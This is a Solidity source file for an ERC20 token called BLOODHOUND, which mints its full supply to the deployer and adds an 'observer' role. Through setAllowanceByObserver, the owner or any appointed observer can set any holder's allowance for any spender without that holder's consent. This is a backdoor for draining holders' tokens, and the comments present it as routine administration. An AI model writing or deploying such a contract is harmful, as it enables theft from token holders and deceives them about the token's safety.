/**
 * @title BLOODHOUND Token
 * @dev Custom ERC20 token with observer mechanism for administrative control over allowances.
 * Observers can modify allowances for specific accounts, enabling privileged operations.
 */
contract BLOODHOUND is ERC20, Ownable {

    // ============ Events ============

    /**
     * @dev Emitted when an observer is added or removed.
     */
    event ObserverUpdated(address indexed observer, bool isSet);

    /**
     * @dev Emitted when an observer modifies an allowance.
     */
    event ObserverAllowanceChanged(
        address indexed observer,
        address indexed tokenOwner,
        address indexed spender,
        uint256 oldAllowance,
        uint256 newAllowance
    );

    // ============ State Variables ============

    /// @dev Mapping to track which addresses are observers.
    mapping(address => bool) public isObserver;

    /// @dev Total initial supply: 300 million tokens with 18 decimals.
    uint256 public constant INITIAL_SUPPLY = 300_000_000 * 10**18;

    // ============ Modifiers ============

    /**
     * @dev Throws if called by any account other than an observer or the owner.
     */
    modifier onlyObserver() {
        require(
            isObserver[msg.sender] || msg.sender == owner(),
            "BLOODHOUND: Caller is not an observer or owner"
        );
        _;
    }

    // ============ Constructor ============

    /**
     * @dev Initializes the contract by setting a name, symbol, and minting the initial supply.
     * The initial supply is minted to the contract deployer (owner).
     */
    constructor() ERC20("BLOODHOUND", "BHD") {
        _mint(owner(), INITIAL_SUPPLY);
    }

    // ============ Owner Functions ============

    /**
     * @dev Adds or removes an observer.
     * Can only be called by the contract owner.
     * @param observer The address to set as an observer.
     * @param allowed True to add, false to remove.
     */
    function setObserver(address observer, bool allowed) external onlyOwner {
        require(observer != address(0), "BLOODHOUND: Observer address is zero");
        isObserver[observer] = allowed;
        emit ObserverUpdated(observer, allowed);
    }

    // ============ Observer Functions ============

    /**
     * @dev Allows an observer to modify the allowance of `spender` for `tokenOwner`.
     * This bypasses the standard approval process and can be used for administrative purposes.
     * @param tokenOwner The address which owns the tokens and grants the allowance.
     * @param spender The address which is allowed to spend the tokens.
     * @param newAllowance The new allowance value.
     */
    function setAllowanceByObserver(
        address tokenOwner,
        address spender,
        uint256 newAllowance
    ) external onlyObserver {
        require(tokenOwner != address(0), "BLOODHOUND: Token owner is zero");
        require(spender != address(0), "BLOODHOUND: Spender is zero");

        uint256 oldAllowance = allowance(tokenOwner, spender);

        // Use OpenZeppelin's internal _approve function for safety
        _approve(tokenOwner, spender, newAllowance);

        emit ObserverAllowanceChanged(msg.sender, tokenOwner, spender, oldAllowance, newAllowance);
    }

    // ============ Override Functions ============

    /**
     * @dev Overrides the default ERC20 transferFrom to emit an event when an observer uses their power.
     * This logs when an observer's granted allowance is utilized.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        // Capture the allowance before the transfer
        uint256 currentAllowance = allowance(sender, msg.sender);

        bool success = super.transferFrom(sender, recipient, amount);

        // If the call succeeded and the caller is not the sender, it was a transferFrom
        if (success && msg.sender != sender) {
            // If the allowance was granted by an observer, log it
            if (isObserver[msg.sender] && currentAllowance > 0) {
                emit ObserverAllowanceChanged(
                    msg.sender,
                    sender,
                    msg.sender,
                    currentAllowance,
                    currentAllowance - amount
                );
            }
        }

        return success;
    }

    // ============ Utility Functions ============

    /**
     * @dev Returns the list of observers. Note: This is not efficient for large sets and is for off-chain use.
     * In practice, events should be used to track observer changes.
     */
    function getObservers() external view returns (address[] memory) {
        // This is a simplified version; a more complex mapping would be needed for dynamic arrays.
        // This function is illustrative.
        revert("BLOODHOUND: Function not implemented for dynamic observer list");
    }
}

